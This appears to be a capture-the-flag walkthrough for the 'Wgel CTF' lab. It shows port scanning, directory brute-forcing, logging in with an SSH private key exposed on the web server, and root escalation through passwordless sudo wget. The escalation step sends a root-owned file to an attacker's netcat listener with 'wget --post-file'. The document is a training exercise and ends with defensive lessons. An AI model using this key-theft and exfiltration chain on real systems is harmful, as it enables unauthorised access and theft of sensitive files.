# Wgel CTF — Full Walkthrough

**Room:** Wgel CTF | **Difficulty:** Easy | **Flags:** 2

| Detail | Value |
|--------|-------|
| Target IP | `10.49.189.55` |
| Attack IP | `10.x.x.x` |
| OS | Linux |

---

## Flags Overview

| # | Method |
|---|--------|
| 01 | Exposed SSH private key → SSH access |
| 02 | `sudo wget` privilege escalation |

---

## Phase 1: Reconnaissance

```bash
nmap -sC -sV 10.49.189.55 -oN nmap_scan.txt
```

**Open Ports:**

| Port | Service |
|------|---------|
| 22/tcp | SSH |
| 80/tcp | HTTP |

### Web Enumeration

```bash
# Directory brute-forcing
gobuster dir -u http://10.49.189.55/sitemap -w /usr/share/wordlists/dirb/common.txt
```

**Findings:**
- HTML comment on the page reveals username: `jessie`
- Discovered `/sitemap/.ssh/` directory containing the `id_rsa` private key

---

## Phase 2: Exploitation — SSH Access

```bash
# Download the exposed SSH key
wget http://10.49.189.55/sitemap/.ssh/id_rsa

# Set correct permissions
chmod 600 id_rsa

# SSH into the target
ssh -i id_rsa jessie@10.49.189.55
```

**User Flag:** `/home/jessie/Documents/user_flag.txt`

---

## Phase 3: Privilege Escalation — `sudo wget`

### Enumeration

```bash
sudo -l
```

**Result:** `jessie` can run `/usr/bin/wget` as **root** without a password.

### Exploitation — File Exfiltration via wget

`wget` has a `--post-file` option that sends a file's contents in an HTTP POST request.

**Attacker machine (listener):**
```bash
nc -lvnp 8080
```

**Target machine (exfiltrate root flag):**
```bash
sudo wget --post-file=/root/root_flag.txt http://10.x.x.x:8080/
```

The root flag is sent to the netcat listener and displayed in plain text.

---

## Vulnerability Chain

1. **Sensitive information disclosure** — SSH private key exposed on web server
2. **Weak SSH configuration** — Private key has no passphrase
3. **Sudo misconfiguration** — User can run `wget` as root with `NOPASSWD`
4. **Binary abuse** — `wget --post-file` reads arbitrary files as root

## Key Takeaways

- **Never expose `.ssh` directories** on a web server
- **Always password-protect SSH private keys**
- **Be careful with `NOPASSWD` sudo entries** — especially for versatile tools like `wget`
